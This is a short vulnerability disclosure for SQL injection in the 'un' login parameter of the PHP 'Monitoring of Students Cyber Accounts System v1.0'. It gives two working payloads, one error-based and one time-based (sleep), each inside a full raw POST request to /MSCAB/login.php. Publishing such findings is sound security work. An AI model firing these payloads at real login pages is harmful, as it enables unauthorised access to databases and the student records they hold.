# Monitoring of Students Cyber Accounts System v1.0 has SQL injection

BUG_Author: Xue Yue

Website source address:https://www.sourcecodester.com/php/11743/monitoring-students-cyber-accounts.html

Vulnerability url: /MSCAB/login.php

POST parameter 'un' exists SQL injection vulnerability

Payload1:un=a' and (select 6 from(select count(*),concat(0x61626364,(select (elt(66=66,1))),0x71727374,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- a&up=b&log=Login

```
POST /MSCAB/login.php HTTP/1.1
Host: localhost
Content-Length: 177
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/MSCAB/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=4ucuktra2adujlr277p85iuap1
Connection: close

un=a' and (select 6 from(select count(*),concat(0x61626364,(select (elt(66=66,1))),0x71727374,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- a&up=b&log=Login
```

Injection success based on errors

![image](https://github.com/xyaly163/bug_report/blob/main/picture/sql1.png)

Payload2:un=a' and (select 7 from (select(sleep(10)))e)-- n&up=b&log=Login

```
POST /MSCAB/login.php HTTP/1.1
Host: localhost
Content-Length: 65
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/MSCAB/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=4ucuktra2adujlr277p85iuap1
Connection: close

un=a' and (select 7 from (select(sleep(10)))e)-- n&up=b&log=Login
```

Server response time is 10 seconds

![image](https://github.com/xyaly163/bug_report/blob/main/picture/sql2.png)
